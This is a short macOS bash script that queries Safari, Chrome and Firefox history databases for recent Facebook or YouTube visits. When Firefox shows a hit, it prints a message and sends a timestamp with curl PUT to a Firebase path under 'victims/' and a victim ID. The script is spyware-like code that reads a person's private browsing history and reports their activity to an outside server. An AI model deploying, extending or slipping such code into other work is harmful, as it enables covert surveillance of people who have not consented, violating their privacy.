#!/usr/bin/env bash
# Lots of information here:
# http://2016.padjo.org/tutorials/sqlite-your-browser-history/

victimID="$1"

source "deploy"

sites=(facebook.com youtube.com)
lastNSeconds=2

function safariQuery() {
  sqlite3 "$HOME/Library/Safari/History.db" "
    SELECT visit_time, title, url
    FROM history_visits
    INNER JOIN history_items
      ON history_items.id = history_visits.history_item
    WHERE
      url like '%facebook.com%' OR
      url like '%youtube.com%'
   ORDER BY visit_time DESC
   LIMIT 10;"
}

function chromeQuery() {
  cp "$HOME/Library/Application Support/Google/Chrome/Default/History" "$HOME/Library/Application Support/Google/Chrome/Default/History.copy"
  sqlite3 "$HOME/Library/Application Support/Google/Chrome/Default/History.copy" "
    SELECT last_visit_time, title, url
    FROM urls
    WHERE
      last_visit_time > $(( (`date '+%s'` - lastNSeconds) * 10000000)) AND (
      url like '%facebook.com%' OR
      url like '%youtube.com%' )
    ORDER BY last_visit_time DESC
    LIMIT 10;"
}

function firefoxQuery(){
  historyFile=`find $HOME/Library/Application\ Support/Firefox/Profiles | grep "places.sqlite$"`;

  sqlite3 "$historyFile" "
    SELECT last_visit_date, url
    FROM moz_places
    WHERE
      last_visit_date > $(( (`date '+%s'` - lastNSeconds) * 1000000)) AND (
      url like '%facebook.com%' OR
      url like '%youtube.com%' )
    ORDER BY last_visit_date DESC
    LIMIT 10;"
}

echo "running clientSide"

if [ ! -z "`firefoxQuery`" ]; then

  echo "Found bad browsing behaviour!"

  currentTime=`date '+%s'`
  curl -s -X PUT -d "$currentTime" "https://${firebaseProject}.firebaseio.com/victims/$victimID/YT_FB_visit.json"
fi

sleep 1.1;
